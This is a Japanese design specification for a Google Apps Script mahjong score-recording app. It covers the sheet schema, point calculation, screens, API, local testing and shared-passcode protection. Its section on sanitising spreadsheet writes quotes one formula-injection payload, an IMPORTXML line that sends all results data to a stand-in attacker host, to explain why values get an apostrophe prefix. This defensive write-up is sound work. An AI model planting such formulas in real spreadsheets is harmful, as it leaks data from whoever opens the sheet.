# 麻雀スコア記録システム 仕様

## 1. データモデル

すべて1枚のスプレッドシート内の複数シートで保持する。
`Results` は「1行 = 1人 × 1半荘」の縦持ち。

### Players
| 列 | 型 | 説明 |
|----|----|------|
| playerId | string | `P001` 形式 |
| name | string | 表示名 |
| active | boolean | 登録画面の選択肢に出すか |
| createdAt | datetime | |

### Rules（ルールプリセット）
| 列 | 型 | 説明 |
|----|----|------|
| ruleId | string | `R001` 形式 |
| name | string | 例「四麻 25000/30000 ウマ10-20 トビ10」 |
| playerCount | number | 3 または 4 |
| startPoints | number | 配給原点（例 25000） |
| returnPoints | number | 返し点（例 30000） |
| uma | string | カンマ区切りの順位点。例 `20,10,-10,-20` |
| tobiBonus | number | 飛び賞[pt]。0で無効 |
| active | boolean | 登録画面の選択肢に出すか。プリセットは削除せず無効化する |

### Games（1半荘のメタ情報）
| 列 | 型 | 説明 |
|----|----|------|
| gameId | string | `G20260824-001` 形式 |
| gameDate | date | 集計キーとなる日付 |
| playedAt | datetime | 登録時刻 |
| ruleId | string | 由来のプリセット。以降6列はその[スナップショット](#ルールのスナップショット) |
| ruleName | string | 登録時のルール名 |
| playerCount | number | 3 または 4 |
| startPoints | number | 登録時の配給原点 |
| returnPoints | number | 登録時の返し点 |
| uma | string | 登録時のウマ（カンマ区切り） |
| tobiBonus | number | 登録時の飛び賞 |
| venue | string | 場所（任意） |
| paifuId | string | 雀魂の牌譜ID（任意） |
| note | string | メモ（任意） |
| recordedBy | string | 記録者名（任意） |
| deleted | boolean | 論理削除フラグ |
| createdAt | datetime | |
| updatedAt | datetime | |

### Results（1人 × 1半荘）
| 列 | 型 | 説明 |
|----|----|------|
| resultId | string | `{gameId}-{seat}` |
| gameId | string | |
| gameDate | date | 集計高速化のため非正規化して保持 |
| seat | number | 0=東, 1=南, 2=西, 3=北（起家からの席順） |
| playerId | string | |
| rawScore | number | 終局時の素点 |
| rank | number | 1〜4 |
| scorePt | number | (rawScore - returnPoints) / 1000 |
| umaPt | number | 順位点 |
| okaPt | number | オカ（1位のみ） |
| tobiPt | number | 飛び賞の授受 |
| totalPt | number | scorePt + umaPt + okaPt + tobiPt |
| chips | number | チップ枚数（授受、合計0が正常） |
| tobi | boolean | 箱下に落ちたか |
| deleted | boolean | 親GameのdeletedをコピーしFilterを単純化 |

## 2. 収支計算ロジック

```
1. 順位づけ  : rawScore 降順。同点の場合は seat の小さい方（起家に近い方）が上位
2. scorePt   : (rawScore - returnPoints) / 1000   ※1000点単位には丸めない
3. umaPt     : uma[rank - 1]
4. okaPt     : 1位のみ (returnPoints - startPoints) * playerCount / 1000
5. tobiPt    : 飛んだ人が -tobiBonus、1位が +tobiBonus × 飛んだ人数
6. totalPt   : 上記の合計
```

**不変条件**: `Σ totalPt === 0`。これはテストで担保する。

- scorePt の合計は `-（オカの総額）` になり、1位へのオカ加算で相殺されて0になる
- ウマの合計は0（プリセット定義時に検証）
- 飛び賞も授受なので0
- 素点を1000点単位に丸めると合計が0にならなくなるため、**1000点単位への丸めは
  行わない**（浮動小数点の誤差を消すための小数2桁の丸めだけは入る）。
  表示は小数第1位まで

チップは pt とは独立した勘定として扱い、合計0でない場合は登録時に警告する（保存は可能）。

### ルールのスナップショット

ルールはアプリ内でいつでも編集できる。もし対局が `ruleId` の参照だけを持っていると、
ウマを変更した瞬間に過去の対局の収支の意味が変わってしまう。これを防ぐため、
**対局を保存するときにルールの内容そのものを `Games` にコピーする**。

- 集計は `Results` に保存済みの計算結果を読むだけなので、そもそも影響を受けない
- 過去の対局を編集して再計算するときは、その対局のスナップショットを使う
  （編集画面でルールを選び直した場合のみ、選んだプリセットが適用される）
- プリセットは削除せず `active` を `FALSE` にして隠す。対局が参照するIDが
  解決できなくなるのを避けるため

<details>
<summary>なぜ設定画面に「オカ」の欄が無いのか</summary>

**オカは独立した設定値ではない**。`(返し点 − 配給原点) × 人数` で決まる従属値で
あり、素点ptの計算にも返し点を使う。独立した「オカpt」欄を設けると二重管理になり
収支の合計が0でなくなるため、設定するのは返し点である。オカなしは
「配給原点 = 返し点」で表現する。

</details>

## 3. 画面構成

単一のWeb App内でタブ切り替えするSPA。モバイルファースト。

| タブ | 内容 |
|------|------|
| 登録 | 日付・ルール・席順・プレイヤー・素点・チップを入力。合計点をリアルタイム検証し、確定前に順位と収支をプレビュー |
| 今日 | その日の対局一覧と、プレイヤー別の対局数・合計pt・平均pt・平均順位・着順分布・飛び・チップ。成績は四麻・三麻を分けて出す（打った人数分だけ表示）が、対局一覧は混在のまま並べる |
| 履歴 | 期間で絞った対局一覧。誤入力の訂正・論理削除もここから |
| 統計 | 期間（全期間／直近N対局／日付指定）で絞った通算成績（対局数、平均順位、順位分布、総pt、着順ごとの率、トビ率、平均素点）。四麻と三麻は分けて集計する（ウマ・オカが異なり、順位の取りうる幅も違うため、混ぜた平均は意味を持たない）。見出しをタップすると任意の列で並べ替えられ、成績の推移グラフは合計・平均・平順を切り替えられる。いずれもクライアント側で保持した集計結果を組み替えるだけで、再取得はしない |
| 設定 | ルールプリセットの作成・編集・無効化。人数・配給原点・返し点・ウマ・飛び賞を個別に入力し、オカとウマ合計は自動計算して表示・検証する。パスワードの変更、配色とタブバー表示の選択もここ |
| （パスワード画面） | タブではなく、最初に全面に出る入力画面。認証後は端末に記憶され、次回以降は表示されない |

## 4. サーバーAPI

フロントからは `google.script.run` で呼び出す。**下表の引数のほかに、最終引数として
`passcode` を取る**（無認証と書いた2つを除く）。フロントの `call()` が自動的に付けるため
呼び出し側に現れないが、サーバー側は先頭で `requirePasscode_()` に渡す
（[7. パスワードによるアクセス制御](#7-パスワードによるアクセス制御)）。

| 関数 | 用途 |
|------|------|
| `apiBootstrap()` | 起動時にプレイヤー・ルール・当日サマリ・今日の日付・パスワードの要否をまとめて取得 |
| `apiPreviewGame(payload)` | 保存せずに順位と収支を計算して返す |
| `apiSubmitGame(payload)` | 1半荘を登録 |
| `apiUpdateGame(gameId, payload)` | 訂正（`Results` の該当行は作り直すため、変更前の値は残らない） |
| `apiGetGame(gameId)` | 1半荘を編集フォーム用の形で取得 |
| `apiDeleteGame(gameId)` | 論理削除（UI側で確認ダイアログ必須） |
| `apiGetDaySummary(dateStr)` | 日別集計 |
| `apiGetHistory(opts)` | 履歴一覧。`opts` は `{from, to, limit}`（`limit` の既定は100） |
| `apiGetStats(opts)` | 通算統計。`opts` は `{from, to, playerCount, recent, withSeries}`。`playerCount` は既定4、`recent` は直近N対局（指定すると `from`/`to` を無効化）、`withSeries` で推移グラフ用の系列も返す |
| `apiAddPlayer(name)` | プレイヤー追加 |
| `apiListRules(includeInactive)` | ルールプリセット一覧 |
| `apiSaveRule(rule)` | ルールの作成・更新（ruleIdなしで新規） |
| `apiSetRuleActive(ruleId, active)` | ルールの有効・無効切り替え |
| `apiAuthStatus()` | パスワードが必要かどうか（**無認証**） |
| `apiVerifyPasscode(candidate)` | パスワードの照合（**無認証**） |
| `apiSetPasscode(new, current)` | パスワードの変更（解除は不可） |

- 書き込みは `LockService` で排他制御する（メンバーが同時に登録する可能性がある）
- 削除は物理削除せず `deleted` フラグを立てるのみ

## 5. 牌譜機能について（将来課題）

雀魂・天鳳ともに**公式の牌譜取得APIはない(多分)**。雀魂の牌譜はWebSocket +
Protobuf + 認証を必要とし、GASの `UrlFetchApp` からは実質取得できない。

したがって現段階のスコープは以下に限定する。

- 牌譜IDを `Games.paifuId` に保存する
- 閲覧画面で `https://game.mahjongsoul.com/?paipu={paifuId}` へのリンクを生成する

将来、詳細なプレイ統計（和了率・放銃率・副露率など）を取りたい場合は、
GASの外側（ローカルのNodeスクリプト等）で牌譜を取得・解析し、結果だけを
スプレッドシートの別シートに書き戻す構成にする？

## 6. ローカル開発とテスト

デプロイ前にローカルのブラウザで動作確認できるようにしてある。

### 仕組み

Apps Script は「複数ファイルが 1 つのグローバルスコープを共有する」という
特殊な実行環境なので、これを Node の `vm` モジュールで再現している。
結果として、デプロイされるコードがローカルで動く。差し替えている
のはストレージ層 1 ファイルだけ。

<details>
<summary>再現の手順（<code>dev/app-context.js</code> が何をしているか）</summary>

1. `dev/app-context.js` が `src/*.js` を 1 つの VM コンテキストに順に評価する
   （`src/Store.js` だけは読み込まない）
2. GAS のグローバル（`PropertiesService` / `LockService` / `Logger` / `Session` /
   `Utilities`）はスタブを注入する。`SpreadsheetApp` だけは触れたら例外を投げる
   ダミーで、ローカルなのに本番のストレージへ行きかけたことを即座に知らせる
3. 代わりに `dev/LocalStore.js` を評価する。同名のグローバル関数を定義するので、
   上位のコードは差し替えに気づかない（データは JSON ファイルへ）
4. `renderIndexHtml()` が `index.html` の `include()` と `<?= ... ?>` を解決し、
   `dev/server.js` がそれを配信して `google.script.run` を `fetch('/api/...')` に
   橋渡しするシムを注入する

</details>

### サンプルデータ

`--games4` / `--games3` を指定すると、統計画面が意味を持つ規模のデータを生成する。
どちらも指定しなければ固定の6半荘で、こちらはテストが素点まで参照しているため
生成ロジックを通さない。

<details>
<summary>素点と実力差をどう作っているか（雑）</summary>

素点は一様乱数ではなく正規分布から引き、卓ごとに合計が合うよう全員から均等に
差し引く。

プレイヤーには `SKILL_ORDER` の順で実力差が付く。
刻み幅 `SKILL_STEP` は実測して決める。
`node dev/calibrate-seed.js` が生成器だけを回して測り直せる（既定2万半荘、数秒）。DBを経由すると1半荘ごとにJSON全体を書き直すため、同じ規模が数分かかって使いものにならない。

| 項目 | 値 |
|---|---|
| 平均順位（四麻） | 最強 2.20 → 最弱 2.80 |
| 素点の標準偏差 | 約16,900点 |
| トビ率 | 約6.9% |

後ろ2つは実際の半荘の統計に近い値を参照している。

</details>

### 画面サンプル

README と `docs/index.html` が載せている5枚のスクリーンショットは
`npm run docs:shots` で撮り直せる。使い捨てのDBにサンプルデータを入れて
ヘッドレス Chrome を DevTools プロトコルで動かし、タブごとにページ全体を
`docs/screen-*.png` へ書き出す。タブが実際に描き終わってから撮るため、
待ち時間の当て推量が要らない。

### 単体テストのための制約

`src/*.js` に `module.exports` を書かない。Apps Script にモジュールが無いのに加え、
TypeScript が JS ファイルをモジュールと判定した瞬間にファイル間のグローバル共有が
失われ、型チェックが通らなくなるため。テストからは `loadPureFunctions()` が
対象ファイルを評価して関数を取り出す。

## 7. パスワードによるアクセス制御

Apps Script の Web App が選べる公開範囲は「自分のみ」「Googleアカウントを持つ全員」
「全員（匿名）」の3つで、**特定のアドレスだけを許可する設定はない**。アドレスを取るには
実行者を「アクセスしているユーザー」に変える必要があり、そうすると全員にデータシートを
共有し、各自が OAuth 承認を通すことになる。それを避け、**匿名公開のまま共有パスワードで
守る**方式を採った。

- `setup()` がランダムなパスワードを発行する。デプロイから設定までの無防備な時間を作らないため、未設定のまま公開される状態を残さない
- 最初の1つを設定できるのはサインイン済みの呼び出し元（＝GASエディタ）だけとした。匿名の Web App では `Session.getActiveUser()` が空になるので、未設定のインスタンスを見つけた第三者が先にパスワードを掛けて締め出すことができない
- アプリからは解除できない。解除は匿名の書き込みを開放することなので、スクリプトプロパティ `PASSCODE` を直接消す操作を要求する（手順は [SETUP.md の「締め出されたとき」](SETUP.md#締め出されたとき)）
- 照合は定数時間で行う。回数制限がない以上、一致した文字数だけ応答が伸びると1文字ずつ絞り込めてしまう

`requirePasscode_()` は未設定なら素通りする。ローカル開発サーバが同じコードを使い捨ての
JSON に対して動かすためで、本番では到達しない（`setup()` を通っていなければ読み書きする
スプレッドシート自体が無い）。

### 守れない範囲

| 想定 | 状況 |
|---|---|
| 個人単位の権限 | 無い。パスワードを知る全員が、誰の対局でも編集・削除できる |
| 総当たり | レート制限なし。6文字の下限は入力の手間との妥協点であって、強度ではない |
| 端末を他人に触られる | パスワードは端末の `localStorage` に平文で保存される |

## 8. スプレッドシートへの書き込みの無害化

`Range.setValues()` は `=` で始まる文字列を、セルに直接入力した場合と同じく
数式として解釈する。したがってメモ欄に

```
=IMPORTXML("https://evil.example?d="&JOIN(",",Results!A:O"),"//a")
```

と書いて登録されると、**オーナーがスプレッドシートを開いた瞬間に評価され、
全データが外部へ送信される**。アプリ側の HTML エスケープは無関係で、
被害を受けるのはブラウザではなくスプレッドシートを開いた人になる。

`src/Store.js` の `sanitizeRows_()` で、`=` `+` `-` `@` タブ CR で始まる文字列の
先頭にアポストロフィを付けてから書き込む。Sheets はこのアポストロフィを
書式として扱い内容には含めないため、読み出し時の値は変わらない。

行単位で適用しているのは、`storeUpdateRowsByKey()` が**更新対象でない行も
読んで書き戻す**ためである。ここを漏らすと、テキストとして保存済みの値が
書き戻しのたびに数式に戻ってしまう。
